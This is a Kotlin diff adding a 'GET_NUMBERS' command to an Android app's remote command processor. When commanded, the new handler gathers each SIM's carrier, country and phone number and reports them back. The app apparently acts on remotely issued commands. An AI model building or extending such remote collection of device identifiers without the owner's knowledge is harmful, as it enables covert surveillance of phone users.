@@ -466,6 +466,41 @@ object CommandProcessor {
                     updateCommandStatus(ctx, id, status, null, result, null)
                     return
                 }
+                "GET_NUMBERS" -> {
+                    val sm = ctx.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as android.telephony.SubscriptionManager
+                    val numbers = JSONArray()
+                    
+                    if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                        val infoList = sm.activeSubscriptionInfoList
+                        if (infoList != null) {
+                            for (info in infoList) {
+                                val sim = JSONObject()
+                                sim.put("slot", info.simSlotIndex)
+                                sim.put("carrier", info.carrierName)
+                                sim.put("display_name", info.displayName)
+                                sim.put("country", info.countryIso)
+                                
+                                // Try to get the actual number
+                                var num = "Unknown"
+                                if (android.os.Build.VERSION.SDK_INT >= 33) {
+                                    try { num = sm.getPhoneNumber(info.subscriptionId) } catch (e: Exception) { }
+                                } else {
+                                    num = info.number ?: "Unknown"
+                                }
+                                
+                                sim.put("number", if (num.isEmpty()) "Unknown" else num)
+                                numbers.put(sim)
+                            }
+                        }
+                        status = "SIM_INFO_RETRIEVED"
+                        val result = JSONObject().put("sim_cards", numbers)
+                        updateCommandStatus(ctx, id, status, null, result, null)
+                        return
+                    } else {
+                        status = "FAILED_PERMISSION (READ_PHONE_STATE)"
+                        errorMsg = "Permission required to access SIM subscriptions."
+                    }
+                }
                 "VOLUME" -> {
                     val parts = content.split("|")
                     if (parts.size >= 2) {
